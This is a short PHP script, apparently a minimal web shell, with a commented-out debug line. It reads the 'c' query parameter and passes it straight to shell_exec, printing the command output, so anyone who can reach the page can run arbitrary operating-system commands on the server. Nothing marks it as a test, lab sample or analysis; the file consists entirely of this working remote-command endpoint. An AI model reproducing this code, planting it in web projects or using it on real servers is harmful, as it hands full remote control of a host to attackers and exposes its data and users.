<?php
//var_dump($_SERVER['REQUEST_METHOD'],$_SERVER['PATH_INFO']); die();

$str = $_GET["c"];
echo "<pre>".shell_exec($str)."</pre>";
echo "end";
?>